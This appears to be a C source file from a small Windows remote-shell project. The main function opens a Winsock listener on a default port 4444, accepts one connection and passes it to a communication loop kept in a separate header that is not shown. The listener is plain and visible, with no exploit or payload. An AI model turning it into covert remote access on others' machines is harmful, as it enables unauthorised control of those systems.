#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "shellComm.h"

#include <winsock2.h>
#include <windows.h>

#ifndef SHELL_COMM_HEADER
#include <ws2tcpip.h>
// Need to link with Ws2_32.lib
// unfortunately this does not work, so when compiling we manually tell gcc to use this library to compile with the "-lws2_32" option.
#pragma comment (lib, "ws2_32.lib")
#endif



// Two macros for stringizing s
// More info at https://gcc.gnu.org/onlinedocs/cpp/Argument-Prescan.html#Argument-Prescan
#define xstr(s) str(s)
#define str(s) #s

#define REPLY_MAX_SIZE 4096
#define BUF_SIZE 512

int startShell();

int port;
char ip[24];

int main(){
    port = 4444;  // default value
    strcpy(ip, "192.168.1.1");  // default value

    #ifdef PORT
        port = PORT;
    #endif

    #ifdef IP
        strcpy(ip, xstr(IP));
    #endif

    startShell();

    return 0;
}

/*
Starts the shell
Return values:
    0 - exited normally/successfully
    1 - exited with error
*/
int startShell() {
    printf("Starting shell with the following settings:\n");
    printf("Port: %d\n", port);
    printf("IP: %s\n", ip);

    // initialize winsock
    WSADATA wsData;
    WORD version = MAKEWORD(2,2);
    int wsock = WSAStartup(version, &wsData);
    if ( wsock != 0) {
        printf("Can't initialize winsock. Quitting...\n");
        return 1;
    }

    // create a socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET){
        printf("Invalid socket. Quitting...\n");
        return 1;
    }

    // bind socket to ip address and port
    struct sockaddr_in hint; // a hint structure (?)
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    hint.sin_addr.S_un.S_addr = INADDR_ANY; //same thing as the inet_pton line - tells to use any address (could set to use only the ip address given...)
    bind(sock, (struct sockaddr*)&hint, sizeof(hint));

    // tell winsock the socket for meant to listen for incoming connections
    listen(sock, SOMAXCONN);
    printf("Listening for incoming connection...\n");

    // wait for a connection
    struct sockaddr_in client;
    int clientSize = sizeof(client);
    SOCKET clientSocket = accept(sock, (struct sockaddr*)&client, &clientSize);

    // the connected host's ip
    char client_ip[NI_MAXHOST];
    memset(client_ip, 0, sizeof(client_ip));

    inet_ntop(AF_INET, &client.sin_addr, client_ip, NI_MAXHOST);
    printf("%s connected on port %d\n", client_ip, port);

    // close listening port once a connection has been recieved
    // don't need the listening socket because now we have the connected socket
    closesocket(sock);

    while( comm(clientSocket, BUF_SIZE, REPLY_MAX_SIZE) );
    closesocket(clientSocket);
    WSACleanup();
    printf("Client ended connection. Good bye!");
    return 0;
}

    